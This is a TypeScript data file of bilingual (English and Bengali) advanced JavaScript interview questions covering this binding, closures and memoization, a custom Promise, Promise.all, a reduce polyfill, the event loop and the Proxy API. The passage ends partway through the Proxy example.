import type { Question } from '../../types';

export const advancedQuestions: Question[] = [
  {
    id: 'javascript-71',
    title: 'Explain dynamic vs lexical this binding in JavaScript.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'this Context', 'Execution Context', 'OOP'],
    enAnswer: 'Regular functions determine this dynamically based on how they are invoked. Arrow functions resolve this lexically, inheriting it from the enclosing execution context during creation.',
    bnAnswer: 'Regular ফাংশন কল করার পদ্ধতির ওপর ভিত্তি করে ডাইনামিকালি this নির্ধারণ করে। Arrow ফাংশন লেক্সিক্যালি this রিজলভ করে, যা তৈরির সময় চারপাশের এনভায়রনমেন্ট থেকে পায়।',
    enExplanation: `### Explanation
- **Dynamic Binding**: A regular function has its own \`this\`. The context changes dynamically:
  - Default: \`window\` (sloppy) or \`undefined\` (strict).
  - Implicit: The object calling the method: \`obj.method()\`.
  - Explicit: Specified via \`call\`, \`apply\`, or \`bind\`.
  - Constructor: The newly created object via \`new\`.
- **Lexical Binding**: Arrow functions do not bind \`this\`. They behave like regular variables during scope lookup, binding permanently to the \`this\` of the nearest enclosing execution context.

### Real-World Example
Event callbacks inside classes. In a class method calling \`setTimeout\`, a regular function callback loses the class reference and binds \`this\` to the window/undefined. An arrow function inherits the class instance context.

### Best Practice
Never use arrow functions for object methods that need to access the object's properties, or for prototype method extensions.

### Common Mistakes
Forgetting that \`bind\` creates a new function. \`myFunc.bind(ctx)\` does not mutate the original function's context; you must save or call the returned reference.

### Code Example
\`\`\`javascript
const user = {
  name: "Rohit",
  // Dynamic binding
  showNameRegular() {
    console.log("Regular:", this.name);
  },
  // Lexical binding
  showNameArrow: () => {
    console.log("Arrow:", this.name); // 'this' points to global scope
  }
};

user.showNameRegular(); // "Regular: Rohit"
user.showNameArrow();   // "Arrow: undefined"

// Detaching regular method shifts this context
const logName = user.showNameRegular;
// logName(); // TypeError (strict mode) or prints global window
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **ডাইনামিক বাইন্ডিং (Dynamic Binding)**: সাধারণ ফাংশনের নিজস্ব \`this\` থাকে যা কল করার সময়ের ওপর ভিত্তি করে ডাইনামিকালি বদলে যায়:
  - ডিফল্ট: গ্লোবাল উইন্ডো বা \`undefined\` (স্ট্রিক্ট মোডে)।
  - ইম্প্লিসিট: মেথড কলকারী অবজেক্ট: \`obj.method()\`।
  - এক্সপ্লিসিট: \`call\`, \`apply\`, বা \`bind\` দিয়ে পাস করা অবজেক্ট।
  - কন্সট্রাক্টর: \`new\` দিয়ে তৈরি হওয়া নতুন অবজেক্ট।
- **লেক্সিক্যাল বাইন্ডিং (Lexical Binding)**: অ্যারো ফাংশন নিজস্ব \`this\` তৈরি করে না। ভ্যারিয়েবল খোঁজার মতোই এটি তার চারপাশের প্যারেন্ট স্কোপের এক্সিকিউশন কনটেক্সট থেকে \`this\` ধার করে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
ক্লাস মেথডের ভেতর \`setTimeout\` লুপ চালানো। সাধারণ ফাংশন দিলে তা তার প্যারেন্ট ক্লাসের রেফারেন্স হারিয়ে ফেলে ও উইন্ডো অবজেক্টে চলে যায়। অ্যারো ফাংশন ব্যবহার করলে তা প্যারেন্ট ক্লাসের \`this\` ধরে রাখে।

### উত্তম অনুশীলন (Best Practice)
অবজেক্টের নিজস্ব মেথড ডিক্লেয়ার করার সময় বা প্রোটোটাইপ চেইন এক্সটেন্ড করার সময় কখনো অ্যারো ফাংশন ব্যবহার করবেন না।

### সাধারণ ভুলসমূহ (Common Mistakes)
\`bind\` মেথডটি অরিজিনাল ফাংশনকেই মিউটেট করে ফেলে মনে করা। এটি মূলত একটি ক্লোন বা কপি দেয়, অরিজিনাল ফাংশনের \`this\` পরিবর্তন করে না।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const user = {
  name: "Rohit",
  // ডাইনামিক বাইন্ডিং
  showNameRegular() {
    console.log("Regular:", this.name);
  },
  // লেক্সিক্যাল বাইন্ডিং
  showNameArrow: () => {
    console.log("Arrow:", this.name); // 'this' গ্লোবাল স্কোপ নির্দেশ করছে
  }
};

user.showNameRegular(); // "Regular: Rohit"
user.showNameArrow();   // "Arrow: undefined"

// অবজেক্ট ছাড়া কল করলে this হারিয়ে যায়
const logName = user.showNameRegular;
// logName(); // strict মোডে TypeError দিবে
\`\`\``
  },
  {
    id: 'javascript-72',
    title: 'Explain Advanced Closures: Module Pattern, Memoization, and Private State.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Closures', 'Module Pattern', 'Memoization'],
    enAnswer: 'Advanced closures enable encapsulation by hiding state variables. The Module Pattern exports only a public API. Memoization caches function results inside a closure scope based on inputs.',
    bnAnswer: 'উন্নত ক্লোজার স্টেট ভ্যারিয়েবল লুকিয়ে রেখে ডাটা এনক্যাপসুলেশন নিশ্চিত করে। মডিউল প্যাটার্ন কেবল পাবলিক এপিআই এক্সপোর্ট করে। মেমোইজেশন কাস্টম ক্যাশ মেইনটেইন করে।',
    enExplanation: `### Explanation
Closures allow building advanced software design patterns:
- **Module Pattern**: An IIFE returns an object containing public methods. These methods access private variables and functions defined inside the IIFE scope, creating clean private access.
- **Memoization**: Optimization pattern that stores computed results keyed by parameters inside a closure cache. Subsequent calls with matching arguments retrieve values from the cache instantly without recalculation.

### Real-World Example
State management. Redux or custom React state systems utilize closures to store the global store state privately, allowing mutations only through dispatched action handlers.

### Best Practice
Utilize memoization for expensive synchronous tasks (like Fibonacci calculations or heavy data mappings) while keeping cache limits to prevent memory bloat.

### Common Mistakes
Forgetting that closures retain reference variables, which can prevent large data buffers from being cleared by the garbage collector (GC) if the closure is persistently active.

### Code Example
\`\`\`javascript
// 1. Memoization Closure
function memoize(fn) {
  const cache = {}; // Private cache store
  
  return function (...args) {
    const key = JSON.stringify(args);
    if (cache[key] !== undefined) {
      console.log("Serving from cache...");
      return cache[key];
    }
    const result = fn.apply(this, args);
    cache[key] = result;
    return result;
  };
}

const expensiveCalculation = memoize((num) => num * num);
console.log(expensiveCalculation(10)); // Calculates & returns 100
console.log(expensiveCalculation(10)); // "Serving from cache..." returns 100
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
ক্লোজার ব্যবহার করে সফটওয়্যার ডিজাইনের শক্তিশালী প্যাটার্ন তৈরি করা যায়:
- **মডিউল প্যাটার্ন (Module Pattern)**: একটি IIFE ফাংশন কেবল একটি পাবলিক অবজেক্ট এপিআই রিটার্ন করে। এই মেথডগুলো IIFE-এর ভেতরের লোকাল ও প্রাইভেট ভ্যারিয়েবল অ্যাক্সেস করতে পারে, যা প্রাইভেট অ্যাক্সেস কন্ট্রোল গড়ে তোলে।
- **মেমোইজেশন (Memoization)**: এটি একটি অপ্টিমাইজেশন টেকনিক যা ইনপুটের ওপর ভিত্তি করে হিসাব করা মান ক্লোজারের কাস্টম ক্যাশ অবজেক্টে সেভ রাখে। পরবর্তী কলের সময় নতুন করে গণনা না করে ক্যাশ থেকে সাথে সাথে রিটার্ন দেয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
স্টেট ম্যানেজমেন্ট। Redux বা কাস্টম রিঅ্যাক্ট স্টেট সিস্টেম ক্লোজার ব্যবহার করে গ্লোবাল স্টেট লুকিয়ে রাখে এবং কেবল অ্যাকশন ডিসপ্যাচ মেথড দিয়ে তা এডিট করার অনুমতি দেয়।

### উত্তম অনুশীলন (Best Practice)
জটিল গাণিতিক হিসাব বা ভারী ডাটা প্রসেসিংয়ের ক্ষেত্রে মেমোইজেশন ব্যবহার করুন, তবে মেমরি বাস্ট হওয়া এড়াতে ক্যাশের একটি সর্বোচ্চ লিমিট বা সাইজ সেট করে রাখা উচিত।

### সাধারণ ভুলসমূহ (Common Mistakes)
ভুলে যাওয়া যে ক্লোজার মেমরি রেফারেন্স আটকে রাখে। ক্লোজারটি সচল থাকলে তার ভেতরের বড় অবজেক্ট বা ডাটা বাফার গার্বেজ কালেক্টর সরাতে পারে না, যা মেমরি লিকের জন্ম দেয়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ১. মেমোইজেশন ক্লোজার
function memoize(fn) {
  const cache = {}; // প্রাইভেট ক্যাশ অবজেক্ট
  
  return function (...args) {
    const key = JSON.stringify(args);
    if (cache[key] !== undefined) {
      console.log("ক্যাশ থেকে ডাটা নেওয়া হচ্ছে...");
      return cache[key];
    }
    const result = fn.apply(this, args);
    cache[key] = result;
    return result;
  };
}

const expensiveCalculation = memoize((num) => num * num);
console.log(expensiveCalculation(10)); // ক্যালকুলেট করে ১০০ দিবে
console.log(expensiveCalculation(10)); // "ক্যাশ থেকে ডাটা নেওয়া হচ্ছে..." ১০০ দিবে
\`\`\``
  },
  {
    id: 'javascript-73',
    title: 'Implement a custom Promise class from scratch.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Promises', 'Promises from scratch', 'Asynchronous'],
    enAnswer: 'A custom Promise handles async resolution by storing handlers, managing states (pending, fulfilled, rejected), and running callbacks in the microtask queue using queueMicrotask.',
    bnAnswer: 'একটি কাস্টম প্রমিজ ক্লাস হ্যান্ডলার সেভ করে, স্টেট ম্যানেজ করে এবং queueMicrotask এপিআই দিয়ে অ্যাসিনক্রোনাসলি রান করে প্রমিজ লজিক ইমপ্লিমেন্ট করে।',
    enExplanation: `### Explanation
To implement a custom Promise (\`MyPromise\`):
1. **State Management**: Initialize state to \`"PENDING"\` and store \`value\` and \`error\`.
2. **Handlers Array**: Keep arrays of success and failure callbacks because multiple \`.then()\` calls can listen to the same promise.
3. **Execution**: The executor executes immediately. If successful, it calls internal \`resolve(value)\`. If failed, it calls \`reject(error)\`.
4. **Microtask Queue**: To comply with the spec, resolving handler callbacks must run asynchronously. We use \`queueMicrotask()\` to achieve this.

### Real-World Example
Understanding library internals. Implementing promises from scratch explains why native promises are asynchronous, how then-chaining works, and how states become immutable once resolved.

### Best Practice
Ensure that call state changes are unidirectional (PENDING -> FULFILLED or PENDING -> REJECTED). Do not allow resolving an already resolved promise.

### Common Mistakes
Running the \`.then()\` callback synchronously. Standard promises *always* resolve asynchronously; even if the promise is already resolved, the callback must run via \`queueMicrotask\`.

### Code Example
\`\`\`javascript
class MyPromise {
  #state = "PENDING";
  #value;
  #handlers = [];

  constructor(executor) {
    const resolve = (val) => this.#updateState("FULFILLED", val);
    const reject = (err) => this.#updateState("REJECTED", err);

    try {
      executor(resolve, reject);
    } catch (e) {
      reject(e);
    }
  }

  #updateState(state, val) {
    if (this.#state !== "PENDING") return;
    this.#state = state;
    this.#value = val;
    this.#runHandlers();
  }

  #runHandlers() {
    if (this.#state === "PENDING") return;
    this.#handlers.forEach(h => queueMicrotask(() => h()));
    this.#handlers = [];
  }

  then(onFulfilled) {
    return new MyPromise((resolve) => {
      const handler = () => {
        if (this.#state === "FULFILLED") {
          resolve(onFulfilled(this.#value));
        }
      };
      this.#handlers.push(handler);
      this.#runHandlers();
    });
  }
}
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
একটি কাস্টম প্রমিজ (\`MyPromise\`) ইমপ্লিমেন্ট করতে:
1. **স্টেট ম্যানেজমেন্ট**: শুরুতে স্টেটকে \`"PENDING"\` রাখতে হবে এবং রিজলভ মান বা এরর ভ্যালু স্টোর করতে হবে।
2. **হ্যান্ডলার অ্যারে**: সাকসেস ও ফেইলুর কলব্যাকগুলোর ট্র্যাক রাখতে অ্যারে মেইনটেইন করা (কারণ একই প্রমিজে একাধিক \`.then()\` থাকতে পারে)।
3. **এক্সিকিউশন**: প্রমিজ ডিক্লেয়ার করলে তার ভেতরের কোড সাথে সাথেই রান হয়। সাকসেস হলে অভ্যন্তরীণ \`resolve()\` এবং এরর হলে \`reject()\` মেথড ট্র্যাপ করে।
4. **মাইক্রোটাস্ক কিউ**: প্রমিজের স্ট্যান্ডার্ড অনুযায়ী কলব্যাকগুলো অবশ্যই অ্যাসিনক্রোনাসলি রান হতে হবে। এর জন্য আমরা \`queueMicrotask()\` এপিআই ব্যবহার করি।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
লাইব্রেরির অভ্যন্তরীণ আর্কিটেকচার বোঝা। নিজেরা কাস্টম প্রমিজ বডি তৈরি করলে স্পষ্ট হওয়া যায় কেন প্রমিজ অ্যাসিনক্রোনাসলি রান হয় এবং কেন একবার এর মান ফিক্সড হয়ে গেলে তা আর এডিট করা যায় না।

### উত্তম অনুশীলন (Best Practice)
স্টেট ট্রানজিশন যেন দ্বিমুখী না হয় তা নিশ্চিত করুন (পেন্ডিং থেকে কেবল ফিলাপড বা রিজেক্টেড হতে পারবে, উল্টো বা অন্যটি হতে পারবে না)।

### সাধারণ ভুলসমূহ (Common Mistakes)
\`.then()\` কলব্যাকটি সিনক্রোনাসলি রান করানো। স্ট্যান্ডার্ড প্রমিজ সবসময় অ্যাসিনক্রোনাস; প্রমিজ আগে থেকে রেজলভ করা থাকলেও কলব্যাক অবশ্যই \`queueMicrotask\` দিয়ে রান হতে হবে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
class MyPromise {
  #state = "PENDING";
  #value;
  #handlers = [];

  constructor(executor) {
    const resolve = (val) => this.#updateState("FULFILLED", val);
    const reject = (err) => this.#updateState("REJECTED", err);

    try {
      executor(resolve, reject);
    } catch (e) {
      reject(e);
    }
  }

  #updateState(state, val) {
    if (this.#state !== "PENDING") return;
    this.#state = state;
    this.#value = val;
    this.#runHandlers();
  }

  #runHandlers() {
    if (this.#state === "PENDING") return;
    this.#handlers.forEach(h => queueMicrotask(() => h()));
    this.#handlers = [];
  }

  then(onFulfilled) {
    return new MyPromise((resolve) => {
      const handler = () => {
        if (this.#state === "FULFILLED") {
          resolve(onFulfilled(this.#value));
        }
      };
      this.#handlers.push(handler);
      this.#runHandlers();
    });
  }
}
\`\`\``
  },
  {
    id: 'javascript-74',
    title: 'Design custom Promise.all and Promise.allSettled from scratch.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Promises', 'Concurrency', 'Coding Challenges'],
    enAnswer: 'Promise.all resolves when all input promises resolve, or rejects immediately upon the first failure. Promise.allSettled resolves only when all inputs complete (either success or fail).',
    bnAnswer: 'Promise.all সব প্রমিজ রেজলভ হলে সফল হয়, অথবা প্রথম এরর পেলেই রিজেক্ট হয়। Promise.allSettled সব প্রমিজ কমপ্লিট (সফল বা ব্যর্থ) হলে রেজলভ হয়।',
    enExplanation: `### Explanation
- **\`Promise.all\`**:
  - Takes an iterable of promises.
  - Returns a single Promise.
  - Resolves to an array of results *preserving original input order*.
  - Rejects immediately if *any* promise rejects.
- **\`Promise.allSettled\`**:
  - Never rejects.
  - Resolves to an array of objects describing the outcome of each promise: \`{ status: "fulfilled", value: ... }\` or \`{ status: "rejected", reason: ... }\`.

### Real-World Example
Dashboard data fetching. If you need user metadata, user scores, and notifications, \`Promise.all\` retrieves all three. If notifications fail but metadata is critical, \`Promise.allSettled\` prevents the whole page from failing due to one optional component error.

### Best Practice
Use \`Promise.all\` when all requests are mutually dependent. Use \`Promise.allSettled\` when requests are independent and you want to display partial success data.

### Common Mistakes
Forgetting that \`Promise.all\` will reject immediately on the first error, leaving other running promises orphaned (they still execute, but their resolved values are discarded).

### Code Example
\`\`\`javascript
// Custom Promise.all Implementation
MyPromiseAll = function (promises) {
  return new Promise((resolve, reject) => {
    const results = [];
    let completedCount = 0;
    
    if (promises.length === 0) return resolve([]);
    
    promises.forEach((promise, index) => {
      Promise.resolve(promise)
        .then(val => {
          results[index] = val; // Preserve original order
          completedCount++;
          if (completedCount === promises.length) {
            resolve(results);
          }
        })
        .catch(reject); // Reject immediately on first error
    });
  });
};
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **\`Promise.all\`**:
  - প্রমিজের একটি অ্যারো লিস্ট ইনপুট হিসেবে নেয়।
  - রিটার্ন পাওয়া ভ্যালুগুলোর ক্রম ইনপুট পাথের ক্রমানুসারেই সাজানো থাকে।
  - যেকোনো একটি প্রমিজ ফেইল বা রিজেক্ট হওয়ার সাথে সাথেই সম্পূর্ণ রেজাল্ট রিজেক্ট হয়ে এরর থ্রো করে।
- **\`Promise.allSettled\`**:
  - এটি কখনো রিজেক্ট হয় না।
  - প্রতিটি প্রমিজের ইন্ডিভিজুয়াল রেজাল্টের স্টেট সমৃদ্ধ অবজেক্টের অ্যারে রিটার্ন করে: \`{ status: "fulfilled", value }\` অথবা \`{ status: "rejected", reason }\`।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
একটি ড্যাশবোর্ডে একই সাথে ইউজারের নাম, রিসেন্ট ট্রানজ্যাকশন ও নোটিফিকেশন এপিআই কল করা। নোটিফিকেশন এপিআই ডাউন থাকলেও যাতে পুরো ড্যাশবোর্ড ব্ল্যাংক না দেখায়, সেজন্য \`Promise.allSettled\` ব্যবহার করা।

### উত্তম অনুশীলন (Best Practice)
কাজগুলো একে অপরের ওপর সম্পূর্ণ নির্ভরশীল হলে \`Promise.all\` ব্যবহার করুন। প্রতিটি রিকোয়েস্ট স্বাধীন হলে আংশিক ডাটা শো করতে \`Promise.allSettled\` ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
\`Promise.all\` প্রথম এররেই রিজেক্ট হয়ে যায়, কিন্তু ব্যাকগ্রাউন্ডে চলতে থাকা বাকি ফেচ রিকোয়েস্টগুলো অটোমেটিক বাতিল হয় না (সেগুলো চলতে থাকে তবে তাদের ডাটা ডিসকার্ড হয়)। রিকোয়েস্ট ক্যানসেল করতে \`AbortController\` ব্যবহার করা দরকার।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// কাস্টম Promise.all ইমপ্লিমেন্টেশন
MyPromiseAll = function (promises) {
  return new Promise((resolve, reject) => {
    const results = [];
    let completedCount = 0;
    
    if (promises.length === 0) return resolve([]);
    
    promises.forEach((promise, index) => {
      Promise.resolve(promise)
        .then(val => {
          results[index] = val; // আসল পজিশনের ক্রম ঠিক রাখে
          completedCount++;
          if (completedCount === promises.length) {
            resolve(results);
          }
        })
        .catch(reject); // প্রথম এরর পেলেই সাথে সাথে রিজেক্ট হবে
    });
  });
};
\`\`\``
  },
  {
    id: 'javascript-75',
    title: 'Design a custom Array reduce method from scratch.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Arrays', 'Custom Helpers', 'Functional Programming'],
    enAnswer: 'A custom reduce implementation iterates over array elements, passing an accumulator, current value, index, and original array to a callback, handling default initial values.',
    bnAnswer: 'কাস্টম reduce ইমপ্লিমেন্টেশন অ্যারের উপাদানগুলোর ওপর ইটারেট করে কলব্যাক ফাংশনে একুমুলেটর, কারেন্ট ভ্যালু, ইনডেক্স ও মূল অ্যারে পাস করে লুপ চালায়।',
    enExplanation: `### Explanation
Implementing Array \`reduce\` from scratch must follow specific ECMAScript specs:
1. **Validation**: Throw a \`TypeError\` if the input callback is not a function.
2. **Initial Value**: Check if an initial value is supplied.
   - If *yes*, set \`accumulator = initialValue\` and start iterating from index \`0\`.
   - If *no*, set \`accumulator = array[0]\` and start iterating from index \`1\`.
3. **Empty Array Exception**: If the array is empty and no initial value is supplied, throw a \`TypeError\`.
4. **Sparse Arrays**: Skip empty holes in sparse arrays (e.g. \`[1, , 3]\`).

### Real-World Example
Understanding array internals. Writing polyfills for older browsers. This shows why not supplying an initial value to reduce can cause crashes if the source list becomes empty at runtime.

### Best Practice
Always supply the initial value parameter in reduce calls to ensure type predictability and prevent runtime empty list crashes.

### Common Mistakes
Forgetting to handle empty arrays without initial values, which violates standard JavaScript specifications.

### Code Example
\`\`\`javascript
Array.prototype.myReduce = function (callback, initialValue) {
  if (typeof callback !== "function") {
    throw new TypeError(callback + " is not a function");
  }
  
  const array = this;
  const length = array.length;
  let index = 0;
  let accumulator;

  // Check if initial value is provided
  if (arguments.length >= 2) {
    accumulator = initialValue;
  } else {
    // If no initial value, find first non-empty element
    while (index < length && !(index in array)) {
      index++;
    }
    if (index >= length) {
      throw new TypeError("Reduce of empty array with no initial value");
    }
    accumulator = array[index++];
  }

  // Iterate
  for (; index < length; index++) {
    if (index in array) {
      accumulator = callback(accumulator, array[index], index, array);
    }
  }

  return accumulator;
};

// Test
const result = [1, 2, 3].myReduce((sum, val) => sum + val, 0);
console.log(result); // 6
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
জাভাস্ক্রিপ্ট স্পেক অনুযায়ী কাস্টম \`reduce\` তৈরি করতে কয়েকটি নিয়ম ফলো করতে হয়:
1. **ভ্যালিডেশন**: কলব্যাকটি ফাংশন টাইপ না হলে সাথে সাথে \`TypeError\` থ্রো করা।
2. **ইনিশিয়াল ভ্যালু চেক**:
   - ইনিশিয়াল ভ্যালু দেওয়া থাকলে \`accumulator = initialValue\` সেট করে ইনডেক্স ০ থেকে ইটারেশন শুরু করা।
   - ইনিশিয়াল ভ্যালু দেওয়া না থাকলে অ্যারের ১ম এলিমেন্টকে (\`array[0]\`) একুমুলেটর ধরে ইনডেক্স ১ থেকে ইটারেশন শুরু করা।
3. **এম্পটি অ্যারে এরর**: অ্যারে খালি থাকলে এবং ইনিশিয়াল ভ্যালু না দিলে \`TypeError\` থ্রো করা।
4. **স্পার্স অ্যারে (Sparse Arrays)**: অ্যারির মধ্যে ফাঁকা জায়গা থাকলে (যেমন \`[1, , 3]\`) লুপে সেই ইনডেক্স স্কিপ করা।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
অ্যারে মেথড পলিফিল তৈরি করা। এটি স্পষ্ট করে কেন \`reduce\` কল করার সময় ইনিশিয়াল ভ্যালু না দিলে ডাটাবেজ থেকে খালি অ্যারে রেসপন্স আসার সাথে সাথে অ্যাপ ক্র্যাশ করে।

### উত্তম অনুশীলন (Best Practice)
টাইপ সেফটি ও খালি অ্যারের ক্র্যাশ এড়াতে \`reduce\` ব্যবহারের সময় সবসময় একটি ইনিশিয়াল ভ্যালু সেট করে দিন।

### সাধারণ ভুলসমূহ (Common Mistakes)
খালি অ্যারে ও ইনিশিয়াল ভ্যালু না থাকার এজ কেসটি মিস করা, যা স্ট্যান্ডার্ড জাভাস্ক্রিপ্ট স্পেক ভায়োলেট করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
Array.prototype.myReduce = function (callback, initialValue) {
  if (typeof callback !== "function") {
    throw new TypeError(callback + " is not a function");
  }
  
  const array = this;
  const length = array.length;
  let index = 0;
  let accumulator;

  // চেক করা হচ্ছে ইনিশিয়াল ভ্যালু আছে কিনা
  if (arguments.length >= 2) {
    accumulator = initialValue;
  } else {
    // ইনিশিয়াল ভ্যালু না থাকলে প্রথম নন-এম্পটি এলিমেন্ট খোঁজা
    while (index < length && !(index in array)) {
      index++;
    }
    if (index >= length) {
      throw new TypeError("Reduce of empty array with no initial value");
    }
    accumulator = array[index++];
  }

  // ইটারেশন লুপ
  for (; index < length; index++) {
    if (index in array) {
      accumulator = callback(accumulator, array[index], index, array);
    }
  }

  return accumulator;
};

// টেস্ট রান
const result = [1, 2, 3].myReduce((sum, val) => sum + val, 0);
console.log(result); // 6
\`\`\``
  },
  {
    id: 'javascript-76',
    title: 'Deep dive into the Event Loop: Rendering Pipeline integration.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Event Loop', 'Rendering Pipeline', 'Performance'],
    enAnswer: 'The browser rendering pipeline (Style, Layout, Paint) runs after the call stack and microtask queue are completely flushed, occurring in sync with the monitor refresh rate.',
    bnAnswer: 'ব্রাউজার রেন্ডারিং পাইপলাইন (Style, Layout, Paint) কল স্ট্যাক এবং মাইক্রোটাস্ক কিউ সম্পূর্ণ খালি হওয়ার পর মনিটরের রিফ্রেশ রেটের সাথে সামঞ্জস্য রেখে রান হয়।',
    enExplanation: `### Explanation
The rendering cycle is integrated within the Event Loop:
1. **Task Execution**: A macrotask runs from the queue (e.g. click event handler).
2. **Microtasks Flush**: All microtasks are executed until the microtask queue is empty.
3. **Render Check**: The browser determines if the frame needs to update (typically every 16.6ms for 60Hz screens).
4. **Render Tasks**: If yes, it executes:
   - Media queries, Scroll/Resize events.
   - \`requestAnimationFrame\` callbacks.
   - Style Recalculation, Layout (geometry calculation), and Paint (rendering pixels).
5. **Next Loop**: If stack is empty, it grabs the next macrotask.
*Note*: Microtasks execute *before* paint. Modifying DOM repeatedly inside a microtask will only result in a single paint at the end of the loop cycle.

### Real-World Example
Why executing complex layout changes in loops freezes rendering. Since microtasks run repeatedly, the event loop is blocked from moving to the Render step, freezing the UI frame.

### Best Practice
Execute visual DOM updates or animations inside \`requestAnimationFrame\` to guarantee they run right before the browser calculates layouts and paints.

### Common Mistakes
Writing heavy layouts updates inside mouse scroll event listeners without throttling. This triggers layout calculations continuously, causing "layout thrashing" and lag.

### Code Example
\`\`\`javascript
// Rendering cycle check (Conceptual)
// Microtask vs Paint order
Promise.resolve().then(() => {
  // Runs before Paint
  document.body.style.background = "red";
});

requestAnimationFrame(() => {
  // Runs right before the next paint cycle
  console.log("Preparing layout properties...");
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
রেন্ডারিং সাইকেল ইভেন্ট লুপের ভেতর যেভাবে কাজ করে:
1. **টাস্ক এক্সিকিউশন**: ম্যাক্রোটাস্ক কিউ থেকে একটি ইভেন্ট রান করে।
2. **মাইক্রোটাস্ক ফ্লাশ**: মাইক্রোটাস্ক কিউতে থাকা সমস্ত কাজ একটার পর একটা শেষ না হওয়া পর্যন্ত চলে।
3. **রেন্ডার চেক**: ব্রাউজার পরীক্ষা করে স্ক্রিনে নতুন ফ্রেম আঁকার সময় হয়েছে কিনা (যেমন ৬০হার্জ স্ক্রিনের জন্য প্রতি ১৬.৬ মিলি-সেকেন্ড পর পর)।
4. **রেন্ডার টাস্ক**: রেন্ডার করার প্রয়োজন হলে এটি নিম্নোক্ত সিকোয়েন্স রান করে:
   - মিডিয়া কুয়েরি, স্ক্রল ও রিসাইজ ইভেন্ট।
   - \`requestAnimationFrame\` কলব্যাকস।
   - স্টাইল রিক্যালকুলেশন, লেআউট (ডিজাইন সাইজ মেলাব) এবং পেইন্ট (পিক্সেল স্ক্রিনে ফুটিয়ে তোলা)।
5. **পরবর্তী চক্র**: মেইন থ্রেড ফাঁকা হলে পরবর্তী ম্যাক্রোটাস্ক রান করায়।
*বিশেষ নোট*: মাইক্রোটাস্ক রেন্ডারিং বা পেইন্টের *পূর্বে* রান হয়। তাই প্রমিজের ভেতর বারবার ডম চেঞ্জ করলেও ব্যবহারকারী কেবল শেষের রিফাইন্ড পেইন্টটিই স্ক্রিনে দেখতে পাবেন।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
একটি লুপের ভেতর জটিল লেআউট ক্যালকুলেশন স্ক্রিন হ্যাং করে কেন? কারণ মাইক্রোটাস্ক কিউ প্রসেস হতেই থাকে, ফলে ইভেন্ট লুপ রেন্ডারিং ফেজে নামতে পারে না ও স্ক্রিন নতুন ফ্রেম দেখায় না।

### উত্তম অনুশীলন (Best Practice)
যেকোনো কাস্টম অ্যানিমেশন বা ডাইনামিক ডম চেঞ্জ \`requestAnimationFrame\` এর ভেতর করুন যাতে তা পেইন্ট সাইকেলের ঠিক পূর্বে রান হয়।

### সাধারণ ভুলসমূহ (Common Mistakes)
থ্রটলিং ছাড়া মাউস স্ক্রল ইভেন্টের ভেতর ডিরেক্ট ডম স্টাইল চেঞ্জ করা। এটি প্রতি মিলি-সেকেন্ডে স্ক্রিন রি-পেইন্ট করতে বাধ্য করে ও ব্রাউজার জ্যাঙ্ক (lag) তৈরি করে।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// রেন্ডারিং সাইকেল ক্রম (ধারণাগত)
Promise.resolve().then(() => {
  // পেইন্টের পূর্বে রান হবে
  document.body.style.background = "red";
});

requestAnimationFrame(() => {
  // ঠিক পেইন্ট শুরু হওয়ার পূর্বে রান হবে
  console.log("লেআউট রেডি হচ্ছে...");
});
\`\`\``
  },
  {
    id: 'javascript-77',
    title: 'Explain the Proxy API and its interceptor traps.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Proxy API', 'Metaprogramming', 'Observables'],
    enAnswer: 'The Proxy API creates a wrapper around a target object, intercepting operations (like get, set, deleteProperty) using handler traps to run custom validation or logging.',
    bnAnswer: 'Proxy API কোনো অবজেক্টের ওপর একটি র‍্যাপার তৈরি করে কাস্টম ট্র্যাপ (যেমন get, set, deleteProperty) দিয়ে এর সব অপারেশন ইন্টারসেপ্ট বা ফিল্টার করতে দেয়।',
    enExplanation: `### Explanation
- **\`Proxy(target, handler)\`**:
  - \`target\`: The original object you want to proxy.
  - \`handler\`: An object containing interceptor hooks called "traps".
- **Common Traps**:
  - \`get(target, prop, receiver)\`: Intercepts property reads.
  - \`set(target, prop, value, receiver)\`: Intercepts property writes. Must return a boolean.
  - \`deleteProperty(target, prop)\`: Intercepts delete operations.
  - \`has(target, prop)\`: Intercepts the \`in\` operator.

### Real-World Example
Implementing reactive state tracking in frameworks (like Vue 3 reactivity). When a component updates state properties, the proxy's \`set\` trap intercepts the update and automatically triggers a UI re-render callback.

### Best Practice
Use Proxy when designing schemas validation layers, data change loggers, or private API gateways where object attributes need strict runtime monitoring.

### Common Mistakes
Forgetting to return a boolean \`true\` inside the \`set\` trap. If you return false or omit the return, writing to the property will throw a TypeError in strict mode.

### Code Example
\`\`\`javascript
const user = { name: "Rohit", age: 25 };

const validatorHandler = {
  get(target, prop) {
    console.log(\`Reading property: \${prop}\`);
    return target[prop];
  },
  set(target, prop, value) {
    if (prop === "age") {
      if (typeof value !== "number" || value < 0) {
        throw new TypeError("Age must be a positive number");
      }
    }
    target[prop] = value;
    return true; // Success indicator
  }
};

